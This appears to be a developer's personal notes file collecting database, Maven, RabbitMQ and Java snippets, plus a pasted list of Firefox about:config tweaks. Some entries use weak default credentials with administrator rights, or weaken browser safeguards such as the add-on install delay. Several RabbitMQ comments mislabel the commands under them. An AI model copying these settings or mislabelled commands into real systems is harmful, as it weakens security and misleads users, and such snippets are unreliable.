--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Database
--------------------------------------------------------------------------------------------------------
"c:\xampp\mysql\bin\mysqld.exe" --defaults-file="c:\xampp\mysql\bin\my.ini" --standalone --console
--------------------------------------------------------------------------------------------------------
CREATE ROLE ivs NOINHERIT NOREPLICATION LOGIN PASSWORD 'user_ivs';
--------------------------------------------------------------------------------------------------------
UPDATE SET date_from=now() AT TIME ZONE 'GMT'
date_from timestamp without time zone
SELECT date_from AT TIME ZONE 'GMT'
--------------------------------------------------------------------------------------------------------
CREATE TABLE IF NOT EXISTS templates (
  id UUID PRIMARY KEY,
  name VARCHAR(255) NOT NULL,
  content BYTEA NOT NULL
);

CREATE TABLE IF NOT EXISTS images (
  id UUID PRIMARY KEY,
  template_id UUID,
  name VARCHAR(255),
  content BYTEA NOT NULL,
  foreign key (template_id) references templates on delete cascade
);

create or replace function bytea_import(p_path text, p_result out bytea)
                   language plpgsql as $$
declare
  l_oid oid;
begin
  select lo_import(p_path) into l_oid;
  select lo_get(l_oid) INTO p_result;
  perform lo_unlink(l_oid);
end;$$;
--------------------------------------------------------------------------------------------------------
create database activiti
CHARACTER SET utf8
COLLATE utf8_bin;

create database activitiadmin
CHARACTER SET utf8
COLLATE utf8_bin;
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### Maven & Gradle
--------------------------------------------------------------------------------------------------------
mvn clean install -DskipTest
cd core
mvn liquibase:update
--------------------------------------------------------------------------------------------------------
mvn clean test -pl streamflyer-core jacoco:report coveralls:report -Pcoverage
mvn clean dependency:copy-dependencies package
mvn site
mvn license:format
--------------------------------------------------------------------------------------------------------
mvn enforcer:display-info
mvn enforcer:enforce
--------------------------------------------------------------------------------------------------------
$ mvn archetype:generate -DgroupId=com.example
 -DartifactId=demo
 -DarchetypeArtifactId=maven-archetype-webapp
 -DinteractiveMode=false
--------------------------------------------------------------------------------------------------------
mvn verify cargo:run
docker-compose up mongodb
mvn spring-boot:run
--------------------------------------------------------------------------------------------------------
gradlew clean build publishToMavenLocal -i -x test
--------------------------------------------------------------------------------------------------------
gradle dependencies
mvn dependency:tree
--------------------------------------------------------------------------------------------------------
mvn license:update-file-header
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### RabbitMQ
--------------------------------------------------------------------------------------------------------
# sbin/rabbitmqctl stop
rabbitmqctl list_permissions --vhost gw1
rabbitmqctl list_permissions --vhost /
# sbin/rabbitmq-server -detached

http://localhost:15672/
# sbin/rabbitmq-plugins enable rabbitmq_management
sbin/rabbitmqctl status
sbin/rabbitmqctl stop
chkconfig --list | grep -i qpid
chkconfig qpidd off
chkconfig --list | grep -i qpid

cd /usr/save
wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.0.4/rabbitmq-server-generic-unix-3.0.4.tar.gz
tar xvfz rabbitmq-server-generic-unix-3.0.4.tar.gz
cd rabbitmq_server-3.0.4

# cd /usr/save/rabbitmq_server-3.0.4
# sbin/rabbitmq-server -detached
--------------------------------------------------------------------------------------------------------
rabbitmqctl add_user userivs ivs
rabbitmqctl set_user_tags userivs administrator
rabbitmqctl set_permissions -p / userivs ".*" ".*" ".*"
rabbitmq-plugins enable rabbitmq_management

## Get a list of vhosts:
curl -i -u userivs:ivs http://localhost:15672/api/whoami
## Get a list of channels, fast publishers first, restricting the info items we get back:
curl -i -u guest:guest http://localhost:15672/api/vhosts
## Create a new vhost:
curl -i -u guest:guest "http://localhost:15672/api/channels?sort=message_stats.publish_details.rate&sort_reverse=true&columns=name,message_stats.publish_details.rate,message_stats.deliver_get_details.rate"
# Create a new exchange in the default virtual host:
curl -i -u guest:guest -H "content-type:application/json" -XPUT http://localhost:15672/api/vhosts/foo
## Delete exchange again:
curl -i -u guest:guest -H "content-type:application/json" -XDELETE http://localhost:15672/api/exchanges/%2F/my-new-exchange

sbin/rabbitmqctl stop
sbin/rabbitmq-server -detached
# sbin/rabbitmqctl status
--------------------------------------------------------------------------------------------------------
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" start & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" stop & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" remove & if not errorlevel 1 exit /b 0
%comspec% /k "C:\Program Files\RabbitMQ Server\rabbitmq_server-3.7.14\sbin\rabbitmq-service.bat" install & if not errorlevel 1 exit /b 0
--------------------------------------------------------------------------------------------------------
mvn clean package -Pprod
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### DEVELOPMENT
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(
  classes = AppConfig.class,
  loader = AnnotationConfigContextLoader.class)
public class SpringRetryTest {
    @Autowired
    private MyService myService;

    @Autowired
    private RetryTemplate retryTemplate;

    @Test(expected = RuntimeException.class)
    public void givenTemplateRetryService_whenCallWithException_thenRetry() {
        retryTemplate.execute(arg0 -> {
            myService.templateRetryService();
            return null;
        });
    }
}
    @Autowired
    private RetryTemplate retryTemplate;

    retryTemplate.execute(arg0 -> {
            myService.templateRetryService();
            return null;
        });               

   retryTemplate.execute(new RetryCallback<Void, RuntimeException>() {
    @Override
    public Void doWithRetry(RetryContext arg0) {
        myService.templateRetryService();
    }
});
--------------------------------------------------------------------------------------------------------
1. Change Number of Content Processes

Do you like to work with a lot of tabs open at any one time, or do you rarely have more than, say, 5 tabs open? The more content processes you have, the more CPU resources will be assigned to each tab (which will also use more RAM).

If you have a powerful PC, then you can set this at a reasonably high number, which should improve the stability and performance of each open tab in Firefox. The name of this setting in about:config is dom.ipc.processCount

Default value: 4

Modified value: 7-12 (depending on number of tabs you usually have open)
2. Disable Unnecessary Animations

Animations in Firefox Quantum are not a bad thing, but if you have an old PC where every MB of RAM counts or simply don’t need these animated flourishes, you can disable them by going to toolkit.cosmeticAnimations.enabled and setting the value to “false.”

Default value: true
Modified value: false
3. Change Minimum Tab Width

It will take a more sharp-eyed Firefox user to notice this adjustment Mozilla made for Firefox Quantum. The default tab width is now just 76 pixels, whereas before it was 100. To adjust this, go to browser.tabs.tabMinWidth.

Default value: 76
Modified value: 100 if you want the same tab width as in older versions of Firefox, but really you can make this whatever you like. Just don’t go overboard!
4. Reduce Session History Cache, Save RAM

If you’re using an older machine, then even the typically speedy Firefox may slow down your PC with the default settings. This could be in part because of how it stores Web pages in its short-term memory (or RAM), which you can access using the Back and Forward buttons.

firefox-about-config-sessionhistory

The preference browser.sessionhistory.max_total_viewers affects how many pages Firefox stores in such a way that they load super fast.

Default value: – 1 (adaptable)
Modified value: any number, reflecting the number of pages you want to store. (We recommend less than 4 if your PC is struggling for speed, while those with 4GB plus can go for 8 or more.)

The preference browser.sessionhistory.max_entries affects how many pages each tab stores in its Back/Forward history altogether.

Default value: 50
Modified value:If your PC is struggling, lower this to 25, check if it helps, then adjust accordingly.
5. Disable Extension Compatibility Checks

Compatibility checks. Who needs ’em, right? Actually they’re pretty handy as a general reference of which extensions will work with your version of Firefox and which won’t, but Firefox doesn’t always get it right. If you want to see whether an extension that Firefox claims is incompatible may actually work, do the following:

    Right-click anywhere on the about:config page, then click “New -> Boolean”
    Type extensions.checkCompatibility into the box, click OK, then select “false” and click OK again.
    This preference will now exist in your list, and you can disable it at any time by right-clicking it and clicking “Reset.”

about-config-disable-compatibility-check
6. Change Firefox Download Location

By default, Firefox downloads go to the Windows “Downloads” folder, but you can change this by tweaking browser.download.folderList

Default value: 1
Modified values:

    0 – Saves all downloads to the desktop
    2 – Saves to the same location as the previous download

7. Get Asked Where You Want Each Download Saved

If you want to have more direct control over your downloads and decide what directory you want each one to be saved in, change the preference browser.download.useDownloadDir to “false.”

Default value: true
Modified value: false – prompts you where to save each download

about-config-firefox-tricks-download-locations
8. Open New Tab for Search Box Results

By default, the things you search for in the Firefox search box open in the current tab. To open in a new tab instead, you’ll need to modify browser.search.openintab

Default value: false – opens search results in current tab
Modified value: true – opens search results in new tab
9. New Tabs Page

Firefox’s New Tabs page organizes all the sites you’ve bookmarked and are most likely to visit in a convenient grid. Best of all, you can tweak how big this grid is, so while it uses 3×3 thumbnails by default, you can change it thanks to the browser.newtabpage.rows and browser.newtabpage.columns preferences.

Default value: 3 in “rows,” 5 in “columns”
Modified values: Whatever number you like!

about-config-firefox-tricks-change-columns
10. Adjust the Smart Location Bar’s Number of Suggestions

In Firefox when you start typing in the location (or URL) bar, a dropdown list of suggested sites will be shown. If you want it to show more (or less) than ten suggestions, you can adjust the browser.urlbar.maxRichResults keys and get it to show the number you want.

Default value: 10
Modified value: Set to your desired number of suggestions. If you want to disable it altogether, set it to -1.
11. Adjust the Session Restore Saving Frequency

Firefox saves your session every fifteen seconds by default, but you can change the value of browser.sessionstore.interval so that Firefox will save the session at a longer interval.

Default: 15000 (in msecs, equivalent to fifteen seconds)
Modified value: Set it to your desired value. 1000 means one sec, and 60000 means one minute
12. Extend Scripts’ Execution Time

In Firefox a script is only given ten seconds to respond, after which it will issue an unresponsive script warning. If you are stuck on a slow network connection, you might want to increase the script execution time via dom.max_script_run_time to cut down on the frequency of the no-script warning.

Default value: 10 (in secs)
Modified value: 20, or any value greater than 10
13. Handling JavaScript Popups

When you come across a site that executes a javascript, open a new window function, and if the popup window is without all the usual window features, e.g. back/forward/reload buttons, status bar, etc., Firefox will automatically treat it as a popup and will not open it as a new tab. However, if you find this to be a nuisance and want to open all new windows in new tabs, you can specify it via the browser.link.open_newwindow.restriction setting.

Default value: 2 – Open all JavaScript windows the same way you have Firefox handle new windows unless the JavaScript call specifies how to display the window

Modified values:

    0 – open all links the way you have Firefox handle new windows
    1 – do not open any new windows
    2 – open all links the way you have Firefox handle new windows unless Javascript specifies how to display the window

14. Enable Spell-Checking in All Text Fields

The default spell-checking function only checks for multi-line text boxes. You can change the option in layout.spellcheckDefault to get it to spell-check for single line text boxes as well.

Default value: 1 (spellcheck for multi-line text boxes only)
Modified values:

    0 – disable spellcheck
    2 – enable spell-check for all text boxes

about-config-firefox-tricks-spellcheck
15. Lower Memory Usage When Minimized

This tweak is mainly for Windows users. When you minimize Firefox, it will send Firefox to your virtual memory and free up your physical memory for other programs to use. Firefox will reduce its physical memory usage, when minimized, to approximately 10MB (give or take some), and when you maximize Firefox it will take back the memory that it needs.

The preference name does not exist and needs to be created.

Right-click on the background and select “New -> Boolean.”

Enter the name when prompted: config.trim_on_minimize

Enter the value: True
16. Increase/Decrease the Amount of Disk Cache

When a page is loaded, Firefox will cache it into the hard disk so that it doesn’t need to be downloaded again the next time it is loaded. The bigger the storage size you cater for Firefox, the more pages it can cache.

Before you increase the disk cache size, make sure that browser.cache.disk.enable is set to “True.”

Config name: browser.cache.disk.capacity
Default value: 50000 (in KB)
Modified value:

    0 – disable disk caching
    Any value lower than 50000 reduces the disk cache
    Any value higher than 50000 increases the disk cache

17. Select All Text When You Click on the URL Bar

In Windows and Mac Firefox highlights all text when you click on the URL bar. In Linux it does not select all the text. Instead, it places the cursor at the insertion point. Regardless of which platform you are using, you can tweak browser.urlbar.clickSelectsAll to either select all or place the cursor at the insertion point.

Modified value:

    False – place cursor at the insertion point
    True – select all text when you click

18. Same Zoom Level for Every Site

Firefox remembers your zoom preference for each site and sets it to your preferences whenever you load the page. If you want the zoom level to be consistent from site to site, you can toggle the value of browser.zoom.siteSpecific from “True” to “False.”

Default value: True
Modified value: False (enable same zoom preferences for every site)
19. Setting Your Zoom Limit

If you find that the max/min zoom level is still not sufficient for your viewing, you can change the zoom limit to suit your viewing habits.

Config name: zoom.maxPercent
Default value: 300 (percent)
Modified value: any value higher than 300

Config name: zoom.minPercent
Default value: 30 (percent)
Modified value: any value
20. Configure Your Backspace Button

In Firefox you can set your backspace by getting it to either go back to the previous page or scroll up a page if it’s a scrolling site. Holding Shift as a modifier will go forward a page if the value is set to 0 and scroll down if the value is set to 1.

Config name: browser.backspace_action
Default value: 0 – goes back a page
Modified value: 1 – scrolls up a page

about-config-firefox-tricks-backspace-config
21. Increase Offline Cache

If you do not have access to the Internet most of the time, you might want to increase the offline cache so that you can continue to work offline. By default, Firefox caches 500MB of data from supported offline web apps. You can change that value to any amount you like.

Config name: browser.cache.offline.capacity
Default value: 512000 (in KB)
Modified value: any value higher than 512000 will increase the cache value
22. Disable Delay Time When Installing Add-ons

Every time you install a Firefox add-on, you will have to wait for several seconds before the actual installation starts. To cut down on this waiting time, you can turn the preference security.dialog_enable_delay off so that the installation will begin immediately.

Default value: 1000 (in msec)
Modified value:

    0 – starts installation immediately
    any other value (in msec)

about-config-firefox-tricks-security-dialog-delay
23. View Source in Your Favorite Editor

This is very useful for developers who are always using the “view source” function. This tweak allows you to view the source code of a given website in an external editor.

There are two configurations that need to be made:

Config name: view_source.editor.external
Default value: False
Modified value: True (enable view source using external text editor)

Config name: view_source.editor.path
Default value: blank
Modified value: insert the file path to your editor here
24. Increasing “Save Link As” Timeout Value

When you right-click and select “Save Link As … ” the browser will request the content disposition header from the URL to determine the filename. If the URL does not deliver the header within one second, Firefox will issue a timeout value. This could happen very frequently in a slow network connection environment. To prevent this issue from happening frequently, you can increase the timeout value to reduce the possibility of a timeout by editing Browser.download.saveLinkAsFilenameTimeout

Default value: 4000 (4 seconds)
Modified value: any value higher than 1000 (value is in msec)
25. Autohide Toolbar in Fullscreen Mode

In fullscreen mode the toolbar is set to autohide and appear only when you hover over it with your mouse. If you want, you can choose to have it visible all the time instead by toggling the value of browser.fullscreen.autohide to “False” to always show the toolbar.

Default value: True (always autohide)
Modified value: False (always show the toolbar)
26. Increase Add-on Search Result

If you go to “Tools -> Add-ons -> Get Add-ons” and perform a search, Firefox will display fifteen matching results. If you want more or less results here, you can adjust extensions.getAddons.maxResults
--------------------------------------------------------------------------------------------------------
  @Pattern(regexp = "^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$")
  private String ipAddress;
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import java.util.Properties;
 
import javax.mail.Address;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.Message.RecipientType;
import javax.mail.MessagingException;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Store;
 
/**
 * This program demonstrates how to get e-mail messages from a POP3/IMAP server
 *
 * @author www.codejava.net
 *
 */
public class EmailReceiver {
 
    /**
     * Returns a Properties object which is configured for a POP3/IMAP server
     *
     * @param protocol either "imap" or "pop3"
     * @param host
     * @param port
     * @return a Properties object
     */
    private Properties getServerProperties(String protocol, String host,
            String port) {
        Properties properties = new Properties();
 
        // server setting
        properties.put(String.format("mail.%s.host", protocol), host);
        properties.put(String.format("mail.%s.port", protocol), port);
 
        // SSL setting
        properties.setProperty(
                String.format("mail.%s.socketFactory.class", protocol),
                "javax.net.ssl.SSLSocketFactory");
        properties.setProperty(
                String.format("mail.%s.socketFactory.fallback", protocol),
                "false");
        properties.setProperty(
                String.format("mail.%s.socketFactory.port", protocol),
                String.valueOf(port));
 
        return properties;
    }
 
    /**
     * Downloads new messages and fetches details for each message.
     * @param protocol
     * @param host
     * @param port
     * @param userName
     * @param password
     */
    public void downloadEmails(String protocol, String host, String port,
            String userName, String password) {
        Properties properties = getServerProperties(protocol, host, port);
        Session session = Session.getDefaultInstance(properties);
 
        try {
            // connects to the message store
            Store store = session.getStore(protocol);
            store.connect(userName, password);
 
            // opens the inbox folder
            Folder folderInbox = store.getFolder("INBOX");
            folderInbox.open(Folder.READ_ONLY);
 
            // fetches new messages from server
            Message[] messages = folderInbox.getMessages();
 
            for (int i = 0; i < messages.length; i++) {
                Message msg = messages[i];
                Address[] fromAddress = msg.getFrom();
                String from = fromAddress[0].toString();
                String subject = msg.getSubject();
                String toList = parseAddresses(msg
                        .getRecipients(RecipientType.TO));
                String ccList = parseAddresses(msg
                        .getRecipients(RecipientType.CC));
                String sentDate = msg.getSentDate().toString();
 
                String contentType = msg.getContentType();
                String messageContent = "";
 
                if (contentType.contains("text/plain")
                        || contentType.contains("text/html")) {
                    try {
                        Object content = msg.getContent();
                        if (content != null) {
                            messageContent = content.toString();
                        }
                    } catch (Exception ex) {
                        messageContent = "[Error downloading content]";
                        ex.printStackTrace();
                    }
                }
 
                // print out details of each message
                System.out.println("Message #" + (i + 1) + ":");
                System.out.println("\t From: " + from);
                System.out.println("\t To: " + toList);
                System.out.println("\t CC: " + ccList);
                System.out.println("\t Subject: " + subject);
                System.out.println("\t Sent Date: " + sentDate);
                System.out.println("\t Message: " + messageContent);
            }
 
            // disconnect
            folderInbox.close(false);
            store.close();
        } catch (NoSuchProviderException ex) {
            System.out.println("No provider for protocol: " + protocol);
            ex.printStackTrace();
        } catch (MessagingException ex) {
            System.out.println("Could not connect to the message store");
            ex.printStackTrace();
        }
    }
 
    /**
     * Returns a list of addresses in String format separated by comma
     *
     * @param address an array of Address objects
     * @return a string represents a list of addresses
     */
    private String parseAddresses(Address[] address) {
        String listAddress = "";
 
        if (address != null) {
            for (int i = 0; i < address.length; i++) {
                listAddress += address[i].toString() + ", ";
            }
        }
        if (listAddress.length() > 1) {
            listAddress = listAddress.substring(0, listAddress.length() - 2);
        }
 
        return listAddress;
    }
 
    /**
     * Test downloading e-mail messages
     */
    public static void main(String[] args) {
        // for POP3
        //String protocol = "pop3";
        //String host = "pop.gmail.com";
        //String port = "995";
 
        // for IMAP
        String protocol = "imap";
        String host = "imap.gmail.com";
        String port = "993";
 
 
        String userName = "your_email_address";
        String password = "your_email_password";
 
        EmailReceiver receiver = new EmailReceiver();
        receiver.downloadEmails(protocol, host, port, userName, password);
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
@ComponentScan
@PropertySource( "classpath:application.properties" )
public class ApplicationContext {

  @Bean
  public FixedBackOffPolicy getBackOffPolicy( final Environment env ) {

    final FixedBackOffPolicy policy = new FixedBackOffPolicy();
    policy.setBackOffPeriod( Long.valueOf( env.getRequiredProperty( "retry.interval" ) ) );

    return policy;
  }

  @Bean
  public ExceptionClassifierRetryPolicy getRetryPolicy( final Environment env ) {

    final Map< Class< ? extends Throwable >, RetryPolicy > policyMap =
      new HashMap< Class< ? extends Throwable >, RetryPolicy >();

    final SimpleRetryPolicy simpleRetryPolicy = new SimpleRetryPolicy();
    simpleRetryPolicy.setMaxAttempts( Integer.valueOf( env.getRequiredProperty( "retry.count" ) ) );

    // Determine the policy per exception
    policyMap.put( ApplicationException.class, simpleRetryPolicy );

    final ExceptionClassifierRetryPolicy retryPolicy = new ExceptionClassifierRetryPolicy();
    retryPolicy.setPolicyMap( policyMap );

    return retryPolicy;
  }

  @Bean
  public WebServiceClientSimulation getWebServiceClient() {
    return new WebServiceClientSimulation();
  }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.integration.channel.DirectChannel;
import org.springframework.messaging.Message;
import org.springframework.messaging.MessageHandler;
import org.springframework.messaging.MessagingException;

public class Main {

    public static void main(String args[]) {

        ApplicationContext ac = new AnnotationConfigApplicationContext(ImapConfig.class);
        DirectChannel inputChannel = ac.getBean("messageChannel", DirectChannel.class);
        inputChannel.subscribe(new MessageHandler() {
            public void handleMessage(Message<?> message) throws MessagingException {

                System.out.println(message);

            }
        });
    }
}
--------------------------------------------------------------------------------------------------------
import com.sun.mail.smtp.SMTPMessage;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import java.io.IOException;
import java.util.Properties;

import static com.paragonsoftware.srs.parser.util.ParserUtils.getBody;
import static com.paragonsoftware.srs.parser.util.ParserUtils.getNullalbleSubject;

@Component
public class Sender {

    private static final Logger logger = LoggerFactory.getLogger(Sender.class);

    @Value("${mail.smtp.host}")
    private String host;
    @Value("${mail.smtp.port}")
    private int port;
    @Value("${support.abandoned}")
    private String supportAbandoned;

    private Properties getProperties() {
        Properties props = new Properties();
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "false");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.smtp.timeout", 5000);
        props.put("mail.smtp.connectiontimeout", 5000);
        props.put("mail.transport.protocol", "smtp");
        return props;
    }

    public boolean sendMail(Message msg) throws NullPointerException {
        logger.info("[SEND] SEND MAIL");

        Session session = Session.getInstance(getProperties());
        try {
            String from = ((InternetAddress) msg.getFrom()[0]).getAddress();
            String subject = getNullalbleSubject(msg);
            Message message = new SMTPMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(supportAbandoned));
            message.setSubject(subject);
            message.setText(getBody(msg));
            Transport.send(message);
            logger.info("Sent message successfully....");
            return true;
        } catch (MessagingException mex) {
            logger.error("Error MessagingException in SEND MAIL", mex);
        } catch (NullPointerException npe) {
            logger.error("Error NullPointerException in SEND MAIL", npe);
            throw npe;
        } catch (IOException e) {
            logger.error("Error IOException in SEND MAIL", e);
        }

        return false;
    }

    public boolean sendErrorMail(Message msg) {
        logger.info("[SEND] SEND ERROR MAIL");

        Session session = Session.getInstance(getProperties());
        try {
            String from = ((InternetAddress) msg.getFrom()[0]).getAddress();
            String subject = getNullalbleSubject(msg);
            Message message = new SMTPMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(supportAbandoned));
            message.setSubject(subject);

            message.setText("An error occured while reading message body. See 'with-errors' mailbox to find original email");

            Transport.send(message);
            logger.info("Sent error message successfully....");
            return true;
        } catch (MessagingException mex) {
            logger.error("Error MessagingException in SEND ERROR MAIL", mex);
        }
        return false;
    }
}
--------------------------------------------------------------------------------------------------------
			return Arrays.stream(messageArray)
					.filter(Objects::nonNull)
					.toArray(Message[]::new);
-------------------------------------------------------------------------------------------------------
List<String> valueList = new ArrayList<>();
valueList.add("Joe");
valueList.add("John");
valueList.add("Sean");
 
Stream<String> stream = valueList.stream();
stream.reduce((first, second) -> second)
  .orElse(null);
  
  
List<String> valueList = new ArrayList<String>();
valueList.add("Joe");
valueList.add("John");
valueList.add("Sean");
 
long count = valueList.stream().count();
Stream<String> stream = valueList.stream();
    
stream.skip(count - 1).findFirst().get();



Stream<Integer> stream = Stream.iterate(0, i -> i + 1);
stream.reduce((first, second) -> second).orElse(null);
--------------------------------------------------------------------------------------------------------
@Component
public class MessageReceiver {

    @StreamListener("SampleQueueA")
    public void onQueueAReceived(DemoMessage msg) {
        System.out.println("Message from A: "+msg);
    }

    @StreamListener("SampleQueueB")
    public void onQueueBReceived(DemoMessage msg) {
        System.out.println("Message from B: "+msg);
    }

}
and Having Simple Message Channel

[public interface MessageChannels {


    @Input("SampleQueueA")
    SubscribableChannel queueA();

    @Input("SampleQueueB")
    SubscribableChannel queueB();
}](url)
application.yml

spring:
  rabbitmq:
    host: 127.0.0.1
    virtual-host: /defaultVH
    username: guest
    password: guest
  cloud:
    stream:
      bindings:
        SampleQueueA:
          binder: rabbit-A
          contentType: application/x-java-object
          group: groupA
          destination: SampleQueueA
        SampleQueueB:
          binder: rabbit-B
          contentType: application/x-java-object
          group: groupB
          destination: SampleQueueB
      binders:
        rabbit-A:
          defaultCandidate: false
          inheritEnvironment: false
          type: rabbit
          environment:
            spring:
              rabbitmq:
                host: 127.0.0.1
                virtualHost: /vhA
                username: guest
                password: guest
                port: 5672
                connection-timeout: 10000
        rabbit-B:
          defaultCandidate: false
          inheritEnvironment: false
          type: rabbit
          environment:
            spring:
              rabbitmq:
                host: 127.0.0.1
                virtualHost: /vhB
                username: guest
                password: guest
                port: 5672
                connection-timeout: 10000
bootstrap.yml

############################################
# default settings
############################################
spring:
  main:
    banner-mode: "off"
  application:
    name: demo-service
  cloud:
    config:
      enabled: true #change this to use config-service
      retry:
        maxAttempts: 3
      discovery:
        enabled: false
      fail-fast: true
      override-system-properties: false

server:
  port: 8080
--------------------------------------------------------------------------------------------------------
@EnableZipkinStreamServer
@SpringBootApplication
public class ZipkinStreamServerApplication {
public static void main(String[] args) {
SpringApplication.run(ZipkinStreamServerApplication.class,args);
}
}
============↓ this is my application.properties===========
server.port=11020
spring.application.name=microservice-zipkin-stream-server
spring.sleuth.enabled=false
zipkin.storage.type=mysql
spring.datasource.schema[0]=classpath:/zipkin.sql
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableAsync
